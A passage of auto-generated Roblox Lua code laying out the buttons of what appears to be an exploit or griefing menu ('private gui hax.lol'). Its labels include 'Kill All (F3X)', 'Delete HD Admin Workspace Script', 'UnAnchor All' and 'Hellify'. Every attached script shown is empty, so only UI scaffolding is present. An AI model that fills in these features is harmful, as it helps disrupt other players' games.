+G2L["32"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["32"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["32"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["32"]["Size"] = UDim2.new(0, 47, 0, 35);
+G2L["32"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["32"]["Text"] = [[Set Auto Colorfy Skybox]];
+G2L["32"]["Name"] = [[Set Colorful SkyBox]];
+G2L["32"]["Position"] = UDim2.new(0.79812, 0, 0.02497, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Set Colorful SkyBox.LocalScript
+G2L["33"] = Instance.new("LocalScript", G2L["32"]);
+
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Set Trippy SkyBox
+G2L["34"] = Instance.new("TextButton", G2L["2c"]);
+G2L["34"]["TextWrapped"] = true;
+G2L["34"]["BorderSizePixel"] = 3;
+G2L["34"]["TextSize"] = 14;
+G2L["34"]["TextScaled"] = true;
+G2L["34"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["34"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["34"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["34"]["Size"] = UDim2.new(0, 47, 0, 35);
+G2L["34"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["34"]["Text"] = [[Set Trippy Skybox]];
+G2L["34"]["Name"] = [[Set Trippy SkyBox]];
+G2L["34"]["Position"] = UDim2.new(0.79812, 0, 0.00367, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Set Trippy SkyBox.LocalScript
+G2L["35"] = Instance.new("LocalScript", G2L["34"]);
+
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button
+G2L["36"] = Instance.new("TextButton", G2L["2c"]);
+G2L["36"]["TextWrapped"] = true;
+G2L["36"]["BorderSizePixel"] = 3;
+G2L["36"]["TextSize"] = 14;
+G2L["36"]["TextScaled"] = true;
+G2L["36"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["36"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["36"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["36"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["36"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["36"]["Text"] = [[Skybox]];
+G2L["36"]["Name"] = [[Button]];
+G2L["36"]["Position"] = UDim2.new(0.02034, 0, 0.05403, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.LocalScript
+G2L["37"] = Instance.new("LocalScript", G2L["36"]);
+
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button
+G2L["38"] = Instance.new("TextButton", G2L["2c"]);
+G2L["38"]["TextWrapped"] = true;
+G2L["38"]["BorderSizePixel"] = 3;
+G2L["38"]["TextSize"] = 14;
+G2L["38"]["TextScaled"] = true;
+G2L["38"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["38"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["38"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["38"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["38"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["38"]["Text"] = [[Decal]];
+G2L["38"]["Name"] = [[Button]];
+G2L["38"]["Position"] = UDim2.new(0.21127, 0, 0.05403, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.LocalScript
+G2L["39"] = Instance.new("LocalScript", G2L["38"]);
+
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button
+G2L["3a"] = Instance.new("TextButton", G2L["2c"]);
+G2L["3a"]["TextWrapped"] = true;
+G2L["3a"]["BorderSizePixel"] = 3;
+G2L["3a"]["TextSize"] = 14;
+G2L["3a"]["TextScaled"] = true;
+G2L["3a"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["3a"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["3a"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["3a"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["3a"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["3a"]["Text"] = [[Mexico Skybox]];
+G2L["3a"]["Name"] = [[Button]];
+G2L["3a"]["Position"] = UDim2.new(0.41315, 0, 0.05403, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.LocalScript
+G2L["3b"] = Instance.new("LocalScript", G2L["3a"]);
+
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button
+G2L["3c"] = Instance.new("TextButton", G2L["2c"]);
+G2L["3c"]["TextWrapped"] = true;
+G2L["3c"]["BorderSizePixel"] = 3;
+G2L["3c"]["TextSize"] = 14;
+G2L["3c"]["TextScaled"] = true;
+G2L["3c"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["3c"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["3c"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["3c"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["3c"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["3c"]["Text"] = [[Mexico Decal]];
+G2L["3c"]["Name"] = [[Button]];
+G2L["3c"]["Position"] = UDim2.new(0.60876, 0, 0.05403, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.LocalScript
+G2L["3d"] = Instance.new("LocalScript", G2L["3c"]);
+
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button
+G2L["3e"] = Instance.new("TextButton", G2L["2c"]);
+G2L["3e"]["TextWrapped"] = true;
+G2L["3e"]["BorderSizePixel"] = 3;
+G2L["3e"]["TextSize"] = 14;
+G2L["3e"]["TextScaled"] = true;
+G2L["3e"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["3e"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["3e"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["3e"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["3e"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["3e"]["Text"] = [[Remove Decal]];
+G2L["3e"]["Name"] = [[Button]];
+G2L["3e"]["Position"] = UDim2.new(0.80908, 0, 0.05403, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.LocalScript
+G2L["3f"] = Instance.new("LocalScript", G2L["3e"]);
+
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button
+G2L["40"] = Instance.new("TextButton", G2L["2c"]);
+G2L["40"]["TextWrapped"] = true;
+G2L["40"]["BorderSizePixel"] = 3;
+G2L["40"]["TextSize"] = 14;
+G2L["40"]["TextScaled"] = true;
+G2L["40"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["40"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["40"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["40"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["40"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["40"]["Text"] = [[Random Neon Color Parts]];
+G2L["40"]["Name"] = [[Button]];
+G2L["40"]["Position"] = UDim2.new(0.02034, 0, 0.0763, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.LocalScript
+G2L["41"] = Instance.new("LocalScript", G2L["40"]);
+
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button
+G2L["42"] = Instance.new("TextButton", G2L["2c"]);
+G2L["42"]["TextWrapped"] = true;
+G2L["42"]["BorderSizePixel"] = 3;
+G2L["42"]["TextSize"] = 14;
+G2L["42"]["TextScaled"] = true;
+G2L["42"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["42"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["42"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["42"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["42"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["42"]["Text"] = [[Delete HD Admin Workspace Script]];
+G2L["42"]["Name"] = [[Button]];
+G2L["42"]["Position"] = UDim2.new(0.21127, 0, 0.0763, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.LocalScript
+G2L["43"] = Instance.new("LocalScript", G2L["42"]);
+
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button
+G2L["44"] = Instance.new("TextButton", G2L["2c"]);
+G2L["44"]["TextWrapped"] = true;
+G2L["44"]["BorderSizePixel"] = 3;
+G2L["44"]["TextSize"] = 14;
+G2L["44"]["TextScaled"] = true;
+G2L["44"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["44"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["44"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["44"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["44"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["44"]["Text"] = [[HD Skeleton Skybox]];
+G2L["44"]["Name"] = [[Button]];
+G2L["44"]["Position"] = UDim2.new(0.41315, 0, 0.0763, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.LocalScript
+G2L["45"] = Instance.new("LocalScript", G2L["44"]);
+
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button
+G2L["46"] = Instance.new("TextButton", G2L["2c"]);
+G2L["46"]["TextWrapped"] = true;
+G2L["46"]["BorderSizePixel"] = 3;
+G2L["46"]["TextSize"] = 14;
+G2L["46"]["TextScaled"] = true;
+G2L["46"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["46"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["46"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["46"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["46"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["46"]["Text"] = [[HD Skeleton Skybox (No Audio)]];
+G2L["46"]["Name"] = [[Button]];
+G2L["46"]["Position"] = UDim2.new(0.60876, 0, 0.0763, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.LocalScript
+G2L["47"] = Instance.new("LocalScript", G2L["46"]);
+
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button
+G2L["48"] = Instance.new("TextButton", G2L["2c"]);
+G2L["48"]["TextWrapped"] = true;
+G2L["48"]["BorderSizePixel"] = 3;
+G2L["48"]["TextSize"] = 14;
+G2L["48"]["TextScaled"] = true;
+G2L["48"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["48"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["48"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["48"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["48"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["48"]["Text"] = [[Kill All (F3X)]];
+G2L["48"]["Name"] = [[Button]];
+G2L["48"]["Position"] = UDim2.new(0.80908, 0, 0.0763, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.LocalScript
+G2L["49"] = Instance.new("LocalScript", G2L["48"]);
+
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button
+G2L["4a"] = Instance.new("TextButton", G2L["2c"]);
+G2L["4a"]["TextWrapped"] = true;
+G2L["4a"]["BorderSizePixel"] = 3;
+G2L["4a"]["TextSize"] = 14;
+G2L["4a"]["TextScaled"] = true;
+G2L["4a"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["4a"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["4a"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["4a"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["4a"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["4a"]["Text"] = [[Elv4r0x Statue]];
+G2L["4a"]["Name"] = [[Button]];
+G2L["4a"]["Position"] = UDim2.new(0.02034, 0, 0.09858, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.LocalScript
+G2L["4b"] = Instance.new("LocalScript", G2L["4a"]);
+
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button
+G2L["4c"] = Instance.new("TextButton", G2L["2c"]);
+G2L["4c"]["TextWrapped"] = true;
+G2L["4c"]["BorderSizePixel"] = 3;
+G2L["4c"]["TextSize"] = 14;
+G2L["4c"]["TextScaled"] = true;
+G2L["4c"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["4c"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["4c"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["4c"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["4c"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["4c"]["Text"] = [[g00byd0lan Skybox]];
+G2L["4c"]["Name"] = [[Button]];
+G2L["4c"]["Position"] = UDim2.new(0.21127, 0, 0.09858, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.LocalScript
+G2L["4d"] = Instance.new("LocalScript", G2L["4c"]);
+
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button
+G2L["4e"] = Instance.new("TextButton", G2L["2c"]);
+G2L["4e"]["TextWrapped"] = true;
+G2L["4e"]["BorderSizePixel"] = 3;
+G2L["4e"]["TextSize"] = 14;
+G2L["4e"]["TextScaled"] = true;
+G2L["4e"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["4e"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["4e"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["4e"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["4e"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["4e"]["Text"] = [[g00byd0lan Decal]];
+G2L["4e"]["Name"] = [[Button]];
+G2L["4e"]["Position"] = UDim2.new(0.41315, 0, 0.09858, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.LocalScript
+G2L["4f"] = Instance.new("LocalScript", G2L["4e"]);
+
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button
+G2L["50"] = Instance.new("TextButton", G2L["2c"]);
+G2L["50"]["TextWrapped"] = true;
+G2L["50"]["BorderSizePixel"] = 3;
+G2L["50"]["TextSize"] = 14;
+G2L["50"]["TextScaled"] = true;
+G2L["50"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["50"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["50"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["50"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["50"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["50"]["Text"] = [[c00lify]];
+G2L["50"]["Name"] = [[Button]];
+G2L["50"]["Position"] = UDim2.new(0.60876, 0, 0.09858, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.LocalScript
+G2L["51"] = Instance.new("LocalScript", G2L["50"]);
+
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button
+G2L["52"] = Instance.new("TextButton", G2L["2c"]);
+G2L["52"]["TextWrapped"] = true;
+G2L["52"]["BorderSizePixel"] = 3;
+G2L["52"]["TextSize"] = 14;
+G2L["52"]["TextScaled"] = true;
+G2L["52"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["52"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["52"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["52"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["52"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["52"]["Text"] = [[k00pify]];
+G2L["52"]["Name"] = [[Button]];
+G2L["52"]["Position"] = UDim2.new(0.80908, 0, 0.09858, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.LocalScript
+G2L["53"] = Instance.new("LocalScript", G2L["52"]);
+
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button
+G2L["54"] = Instance.new("TextButton", G2L["2c"]);
+G2L["54"]["TextWrapped"] = true;
+G2L["54"]["BorderSizePixel"] = 3;
+G2L["54"]["TextSize"] = 14;
+G2L["54"]["TextScaled"] = true;
+G2L["54"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["54"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["54"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["54"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["54"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["54"]["Text"] = [[Invisible Yourself]];
+G2L["54"]["Name"] = [[Button]];
+G2L["54"]["Position"] = UDim2.new(0.02034, 0, 0.12037, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.LocalScript
+G2L["55"] = Instance.new("LocalScript", G2L["54"]);
+
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button
+G2L["56"] = Instance.new("TextButton", G2L["2c"]);
+G2L["56"]["TextWrapped"] = true;
+G2L["56"]["BorderSizePixel"] = 3;
+G2L["56"]["TextSize"] = 14;
+G2L["56"]["TextScaled"] = true;
+G2L["56"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["56"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["56"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["56"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["56"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["56"]["Text"] = [[UnInvisible Yourself]];
+G2L["56"]["Name"] = [[Button]];
+G2L["56"]["Position"] = UDim2.new(0.21127, 0, 0.12037, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.LocalScript
+G2L["57"] = Instance.new("LocalScript", G2L["56"]);
+
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button
+G2L["58"] = Instance.new("TextButton", G2L["2c"]);
+G2L["58"]["TextWrapped"] = true;
+G2L["58"]["BorderSizePixel"] = 3;
+G2L["58"]["TextSize"] = 14;
+G2L["58"]["TextScaled"] = true;
+G2L["58"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["58"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["58"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["58"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["58"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["58"]["Text"] = [[oh ya mr krab Script]];
+G2L["58"]["Name"] = [[Button]];
+G2L["58"]["Position"] = UDim2.new(0.41315, 0, 0.12037, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.LocalScript
+G2L["59"] = Instance.new("LocalScript", G2L["58"]);
+
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button
+G2L["5a"] = Instance.new("TextButton", G2L["2c"]);
+G2L["5a"]["TextWrapped"] = true;
+G2L["5a"]["BorderSizePixel"] = 3;
+G2L["5a"]["TextSize"] = 14;
+G2L["5a"]["TextScaled"] = true;
+G2L["5a"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["5a"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["5a"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["5a"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["5a"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["5a"]["Text"] = [[KaaX Script]];
+G2L["5a"]["Name"] = [[Button]];
+G2L["5a"]["Position"] = UDim2.new(0.60876, 0, 0.12037, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.LocalScript
+G2L["5b"] = Instance.new("LocalScript", G2L["5a"]);
+
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button
+G2L["5c"] = Instance.new("TextButton", G2L["2c"]);
+G2L["5c"]["TextWrapped"] = true;
+G2L["5c"]["BorderSizePixel"] = 3;
+G2L["5c"]["TextSize"] = 14;
+G2L["5c"]["TextScaled"] = true;
+G2L["5c"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["5c"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["5c"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["5c"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["5c"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["5c"]["Text"] = [[Hellify]];
+G2L["5c"]["Name"] = [[Button]];
+G2L["5c"]["Position"] = UDim2.new(0.80908, 0, 0.12037, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.LocalScript
+G2L["5d"] = Instance.new("LocalScript", G2L["5c"]);
+
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button
+G2L["5e"] = Instance.new("TextButton", G2L["2c"]);
+G2L["5e"]["TextWrapped"] = true;
+G2L["5e"]["BorderSizePixel"] = 3;
+G2L["5e"]["TextSize"] = 14;
+G2L["5e"]["TextScaled"] = true;
+G2L["5e"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["5e"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["5e"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["5e"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["5e"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["5e"]["Text"] = [[1x1fy]];
+G2L["5e"]["Name"] = [[Button]];
+G2L["5e"]["Position"] = UDim2.new(0.02034, 0, 0.14216, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.LocalScript
+G2L["5f"] = Instance.new("LocalScript", G2L["5e"]);
+
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button
+G2L["60"] = Instance.new("TextButton", G2L["2c"]);
+G2L["60"]["TextWrapped"] = true;
+G2L["60"]["BorderSizePixel"] = 3;
+G2L["60"]["TextSize"] = 14;
+G2L["60"]["TextScaled"] = true;
+G2L["60"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["60"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["60"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["60"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["60"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["60"]["Text"] = [[UnAnchor All]];
+G2L["60"]["Name"] = [[Button]];
+G2L["60"]["Position"] = UDim2.new(0.21127, 0, 0.14216, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.LocalScript
+G2L["61"] = Instance.new("LocalScript", G2L["60"]);
+
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button
+G2L["62"] = Instance.new("TextButton", G2L["2c"]);
+G2L["62"]["TextWrapped"] = true;
+G2L["62"]["BorderSizePixel"] = 3;
+G2L["62"]["TextSize"] = 14;
+G2L["62"]["TextScaled"] = true;
+G2L["62"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["62"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["62"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["62"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["62"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["62"]["Text"] = [[Classic Baseplate]];
+G2L["62"]["Name"] = [[Button]];
+G2L["62"]["Position"] = UDim2.new(0.41315, 0, 0.14216, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.LocalScript
+G2L["63"] = Instance.new("LocalScript", G2L["62"]);
+
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button
+G2L["64"] = Instance.new("TextButton", G2L["2c"]);
+G2L["64"]["TextWrapped"] = true;
+G2L["64"]["BorderSizePixel"] = 3;
+G2L["64"]["TextSize"] = 14;
+G2L["64"]["TextScaled"] = true;
+G2L["64"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["64"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["64"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["64"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["64"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["64"]["Text"] = [[Auto Neon Color Parts]];
+G2L["64"]["Name"] = [[Button]];
+G2L["64"]["Position"] = UDim2.new(0.60876, 0, 0.14216, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.LocalScript
+G2L["65"] = Instance.new("LocalScript", G2L["64"]);
+
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button
+G2L["66"] = Instance.new("TextButton", G2L["2c"]);
+G2L["66"]["TextWrapped"] = true;
+G2L["66"]["BorderSizePixel"] = 3;
+G2L["66"]["TextSize"] = 14;
+G2L["66"]["TextScaled"] = true;
+G2L["66"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["66"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["66"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["66"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["66"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["66"]["Text"] = [[Fencing Restore 1]];
+G2L["66"]["Name"] = [[Button]];
+G2L["66"]["Position"] = UDim2.new(0.80908, 0, 0.14216, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.LocalScript
+G2L["67"] = Instance.new("LocalScript", G2L["66"]);
+
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button
+G2L["68"] = Instance.new("TextButton", G2L["2c"]);
+G2L["68"]["TextWrapped"] = true;
+G2L["68"]["BorderSizePixel"] = 3;
+G2L["68"]["TextSize"] = 14;
+G2L["68"]["TextScaled"] = true;
+G2L["68"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["68"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
